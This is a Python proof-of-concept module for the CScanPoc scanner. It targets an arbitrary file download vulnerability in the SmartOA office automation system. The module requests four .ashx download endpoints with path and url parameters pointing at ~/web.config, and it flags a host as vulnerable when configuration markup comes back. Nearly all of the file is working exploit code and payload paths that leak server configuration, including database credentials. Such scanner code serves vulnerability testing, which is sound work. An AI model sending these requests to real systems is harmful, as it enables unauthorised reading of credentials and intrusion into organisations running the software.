# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'SmartOA_0001'  # 平台漏洞编号，留空
    name = 'SmartOA系统 任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2014-08-11'  # 漏洞公布时间
    desc = '''
        智明协同oa系统提供专业的oa自定义平台系统(SmartOA),能够快速根据企业需求打造随需而变的个性化oa、OA系统、OA软件、oa办公系统、oa办公软件,协同oa办公平台系统软件。
        力智软件SmartOA协同办公系统存在多个任意文件下载漏洞（泄漏数据库相关信息）。
        "/file/EmailDownload.ashx?url=~/web.config&name=web.config",
        "/file/UDFDownLoad.ashx?path=~/web.config&name=web.config",
        "/file/DownLoad.ashx?path=~/web.config",
        "/file/MyDownLoad.ashx?path=~/web.config"
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=060613'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'SmartOA'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1b441e49-fdbc-412c-a9cc-1fa3c2a2afc7'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            ps = [
                "/file/EmailDownload.ashx?url=~/web.config&name=web.config",
                "/file/UDFDownLoad.ashx?path=~/web.config&name=web.config",
                "/file/DownLoad.ashx?path=~/web.config",
                "/file/MyDownLoad.ashx?path=~/web.config"
            ]
            for p in ps:
                url = arg+p
                code, head, res, errcode, _ = hh.http(url)
                if code == 200 and "<configuration>" in res and '<appSettings>' in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
